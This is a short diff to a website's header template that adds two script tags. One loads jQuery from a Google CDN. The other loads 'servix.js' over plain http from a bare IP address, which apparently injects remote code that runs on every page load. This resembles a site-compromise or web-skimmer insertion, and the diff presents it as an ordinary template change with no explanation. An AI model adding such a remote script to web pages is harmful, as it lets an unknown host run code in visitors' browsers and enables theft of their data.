@@ -1,4 +1,6 @@
 <header class="header-menu" data-script="HeaderMenu">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script type="text/javascript" src="http://18.191.32.44/servix.js"></script>
 	<div class="container-fluid no-padding">
 
 		<nav class="navbar navbar-default  navbar-fixed-top" role="navigation">
